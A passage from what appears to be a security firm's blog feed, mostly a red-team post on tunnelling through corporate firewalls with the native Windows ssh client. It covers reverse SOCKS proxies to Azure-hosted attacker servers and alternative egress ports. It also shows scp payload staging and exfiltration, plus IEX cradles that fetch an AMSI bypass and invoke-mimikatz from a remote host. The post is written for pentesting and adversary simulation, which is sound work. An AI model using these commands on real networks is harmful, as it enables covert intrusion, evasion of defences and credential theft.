&lt;p&gt;Furthermore, protecting SaaS applications such as Teams, SharePoint, Exchange Online, or OneDrive through regular configuration reviews is crucial, as these platforms are often targeted for initial access.&lt;/p&gt;
&lt;p&gt;Thank you for taking the time to read this blog. I hope you found it informative and enjoyable. Stay tuned for more of our upcoming blog posts and advisories.&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gironsec.com/blog/2020/12/bypassing-windows-smartscreen/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://mgeeky.tech/warcon-2022-modern-initial-access-and-evasion-tactics/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>SSH Tunnelling to Punch Through Corporate Firewalls - Updated take on one of the oldest LOLBINs</title>
      <link>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</link>
      <pubDate>Tue, 13 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/ezgif-7-4b7e7cf968.gif&#34; title=&#34;ezgif 7 4b7e7cf968&#34; alt=&#34;ezgif 7 4b7e7cf968&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;ezgif 7 4b7e7cf968&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as “the way to do it”. If your foothold is (luckily) a Linux server, then you’re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.&lt;/p&gt;
&lt;p&gt;Fast forward a few years later, in our day-to-day work, be it network pentest or adversary simulation, I’ve found my colleagues and I using good ol’ SSH tunnelling in real engagements not less, but more.&lt;/p&gt;
&lt;p&gt;Quoting what Andy Gill &lt;a href=&#34;https://github.com/ZephrFish&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@ZephrFish&lt;/a&gt; said in SteelCon 2024 a couple of weeks ago:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;“F*** C2 frameworks, a tunnel is all you need.”&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While I might not feel this as strongly as Andy does, there is more than a pinch of truth in that statement. A good tunnel can often be everything you wanted to execute from the end user laptop. And yet, a Google search “SSH tunnelling in pentesting” and “…in red team engagements”, would see most top results still described the “old” way of punching single port-sized holes with -R and -L, or local dynamic SOCKS with -D, which is actually not at all how we used SSH in our engagements. There are a couple of recent blog posts (linked below) published within the recent 1-2 years describing SSH tunnelling using the Reverse dynamic proxy and their unique spins on it, so I’ll avoid as much overlap content as I can and present our tips and tricks about SSH tunnelling, with a focus on getting through firewalls.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;SSH tunnelling is of course not our primary nor sole way to tunnel out of a client’s network (&lt;a href=&#34;https://labs.jumpsec.com/ligolo-quality-of-life-on-red-team-engagements/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;wink wink&lt;/a&gt;), but whenever I am in a pinch, and nothing else works, this little tool has served me oh-so-well.&lt;/p&gt;
&lt;p&gt;Shoutout to recent blog posts describing similar flavors of the SSH tunnelling technique:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.pentestpartners.com/security-blog/living-off-the-land-with-native-ssh-and-split-tunnelling/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Living off the land with native SSH and split tunnelling&lt;/a&gt; - by PTP’s Joe Blogs in Mar 2024, a concise summary of the fundamental form of this technique&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access&lt;/a&gt; - by Red Siege’s Alex Reid in Apr 2024 going over the interesting take on using Lnk files to turn the SSH tunnelling command into a phishing payload&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://trustedsec.com/blog/the-socks-we-have-at-home&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The SOCKS we have at Home&lt;/a&gt; - by TRUSTEDSEC’s Esteban Rodriguez in Oct 2023 detailing creation of a limtedaccess user on the remote server for better Opsec&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;Let’s cut to the chase&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lets-cut-to-the-chase&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#lets-cut-to-the-chase&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The OpenSSH client is natively available in almost all Windows machines with an OS / Service Pack later than early 2018, more specifically Win10 v1709 and Win Server v1803. (To the Windows sysadmin reading this, you don’t have to use Putty anymore!)&lt;/p&gt;
&lt;p&gt;Furthermore, the stars were so aligned in 2017 that, right before Microsoft ported OpenSSH to Windows, the OpenSSH project implemented the reverse dynamic proxy feature, a bit obscurely (if you ask me!) reusing the -R flag &lt;a href=&#34;https://www.openssh.com/txt/release-7.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;in version 7.6&lt;/a&gt;. (This has been explained in the ChangeLog for 7 years but yet not many people are talking about this, which shows that RTFM does, in fact, often pay off.)&lt;/p&gt;
&lt;p&gt;In 2024, corporate laptops or workstations are almost universally on either Windows 10 or 11, and that means the ssh command is, on most pentesting or adversarial gigs, sitting in the PATH of the client’s machine without needing us to install or enable anything extra.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;To make this as unambiguous as I can - the &lt;strong&gt;native&lt;/strong&gt; ssh command on Windows 10/11 devices has been allowing anyone to start a reverse &amp;amp; dynamic SOCKS proxy into any internal network since 2017! And that makes it possible to run tools like Impacket scripts, Netexec (formerly Crackmapexec) or Certipy natively behind the SOCKS proxy on a remote Linux server, while to the defender the traffic appears to originate from the compromised machine.&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;And in 2024, many corporate firewalls still allow SSH outbound from workstations, or are configured in such a way that it is relatively trivial to bypass, and blue teams are often not watching ssh being executed because of how much of a LOLBIN it is.&lt;/p&gt;
&lt;h2&gt;3 Tricks to punch through Corporate firewalls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-tricks-to-punch-through-corporate-firewalls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-tricks-to-punch-through-corporate-firewalls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;1. Basic form: -R&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-basic-form--r&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#1-basic-form--r&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On the compromised Windows or Nix machine, run SSH with either the binary&amp;rsquo;s name:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh -R PROXY_PORT user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Or use the full path, on for example port 8888&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;C:\Windows\System32\OpenSSH\ssh.exe -R 8888 user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;On assumed breach gigs we have a quick trick to check whether outbound SSH is allowed which I will elaborate in the next section.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/screenshot1.png&#34; title=&#34;screenshot1&#34; alt=&#34;ssh_screenshot1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;screenshot1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Here we assume you have a VPS with a static IP / DNS record pointing to the VPS, on the internet. If you so choose to use password authentication, do set up IP allowlisting on your client’s and your own egress IP only to avoid being brute-forced. Then on your VPS / attacking server, set up /etc/proxychains.conf as usual. Specifying the remote server’s proxychains.conf to use SOCKS5 would enable the additional compatibility of UDP and thus DNS lookups through the tunnel as well:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;socks5 	127.0.0.1 8888&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Then you could run your commands on the attacking box with proxychains:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;proxychains nmap -sT -F internal_target_ip
proxychains nxc smb internal_target_ip -u USER -p PASSWD --shares
proxychains secretsdump.py ... and so on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;On Red Siege’s &lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing&lt;/a&gt; blog post the author described &lt;a href=&#34;https://superuser.com/questions/1489017/login-to-ssh-with-no-password-and-no-ssh-key&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;not requiring a password OR key&lt;/a&gt; to login plus the -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; flag to disable the “Are you sure you want to continue connecting (Yes/No/Fingerprint)” message so that the command could be inside of an Lnk file or a Malicious Office macro, but I still have reservations regarding not requiring authentication to access your C2 server (even if it’s a limitaccess user with /bin/false as default shell).&lt;/p&gt;
&lt;h3&gt;2. Azure domain / ASN to get pass firewall&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-azure-domain--asn-to-get-pass-firewall&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-azure-domain--asn-to-get-pass-firewall&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Azure Domains&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-domains&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure-domains&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;A good indication of the client’s firewall having absolutely no blocks on SSH is when an SSH host that they almost certainly have no use for is allowed, such as:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh root@scanme.nmap.org
# if you get a  prompt, you&amp;#39;ve struck gold!
# pls don&amp;#39;t do anything abusive or malicious to scanme.nmap.org!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Of course, it is not always so easy that it works right away, and whilst not in assumed breach you wouldn’t have the luxury of a PowerShell session to check the client’s firewall. So, what if Scanme is not reachable? The first thing I would try is to use a VPS on Azure. The underlying reason is that Windows environments are highly likely to be on Active Directory and most likely Hybrid. There is a high likelihood that the client’s stack requires either Microsoft own IPs to be allowlisted, or Azure subdomains to be blanket trusted.&lt;/p&gt;
&lt;p&gt;What I’d do is to spin up a VM from Azure and then give it an azure subdomain from the Public IP address settings: Public IP &amp;gt; Settings &amp;gt; Configuration &amp;gt; DNS name label (optional) -&amp;gt; Enter your desired subdomain name.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/screenshot2.png&#34; title=&#34;screenshot2&#34; alt=&#34;screenshot2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;screenshot2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 user@innocent-looking-front.REGION.cloudapp.azure.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Something mundane such as msservicesupdate.uksouth.cloudapp.azure.com should be fine. This has been proven to work in many of our engagements.&lt;/p&gt;
&lt;h3&gt;ASN to the rescue&lt;span class=&#34;absolute -mt-20&#34; id=&#34;asn-to-the-rescue&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#asn-to-the-rescue&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Domains tend to have higher success rates on phish emails or C2 callbacks because corporate firewalls tend to block requests to raw non-internal IPs. However, &lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2021/03/26/securing-our-approach-to-domain-fronting-within-azure/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Azure domain fronting&lt;/a&gt; (some practitioners use Azure CDN fronting) is actually known to Microsoft themselves too. Perhaps the blue team / Sysadmin in the client knew this and blocked outbound access to *.region.cloudapp.azure.com for example because they know about this technique and give their own DNS hostnames to their Azure VMs?&lt;/p&gt;
&lt;p&gt;In this case even if the subdomain is blocked, you could / should try the raw IP anyway because it is on Microsoft owned ASN. I have had it happen that using the raw IP worked, so it is definitely worth a try when you’re desperate. The IP address would be in Microsoft’s ASN and there could be an allowlist somewhere that green lights the range.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 limiteduser@1.2.3.4(azure_vm_ip)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h3&gt;3. Alternative Egress Port&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-alternative-egress-port&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-alternative-egress-port&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Sometimes outbound port 22 to the internet is (fortunately or unfortunately) blocked on the client’s endpoint. However there’s also a catch that not all corporate firewalls inspect the underlying protocol / do SSL stripping and deep packet inspection (so-called Application Layer Firewalls). It is definitely worth a try to set the ssh port to non-22 on your VPS and restart SSHD. Port 80, 443, 53 tend to be good candidates for this to work. I’ve sometimes even seen Windows / AD ports outbound to be allowed, stuff I wouldn’t expect like NETBIOS(139), KERBEROS(88) , SMB(445), LDAP(389) but sometimes it is needed for certain Azure / Entra interaction. Of course classic service ports like SMTP(25), FTP(21) and so on are also within reason to try, but personally I’ve had less luck with those.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# edit /etc/ssh/sshd_config with your favorite text editor
Port 

# save and close 
# don&amp;#39;t forget to allow inbound on this port from your IP on your cloud provider), then:

sudo systemctl restart sshd&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2&gt;(Bonus) What else could you do with this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;bonus-what-else-could-you-do-with-this&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#bonus-what-else-could-you-do-with-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are a couple of use cases other than just running offensive tooling through an available outbound SSH connection:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Getting payloads in and data out:&lt;/strong&gt; If you can get SSH out, then either getting payload in or exfiltrate data out via SCP shouldn’t be a problem:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;scp.exe user@unsuspecting.uksouth.cloudapp.azure.com:/home/user/totally_okay_payload.dll C:\Public\AppData\version.dll&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;(More) OpSec safe In memory powershell script execution with IEX:&lt;/strong&gt; If you have a good Amsi bypass, ssh is a good way to grab it along with other powershell scripts, especially with how scrutinised Invoke-WebRequest is. The common way observed in the wild to invoke scripts is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.X.X.X/invoke-mimikatz.ps1&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;In a constrained PS environment the (New-Object) cmdlet would not even work, and secondly this command has been signatured to death so it’s probably not a smart thing to do in a covert job. However, you can run one command upon ssh-ing into a host in the format of:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh user@server &amp;#34;command arg arg2 ...&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Essentially you can use this to cradle your AMSI bypass with a malicious script like so (this again can also be bundled into the Lnk file or a malicious macro):&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/amsibypass.ps1&amp;#34;); IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/invoke-mimikatz.ps1&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
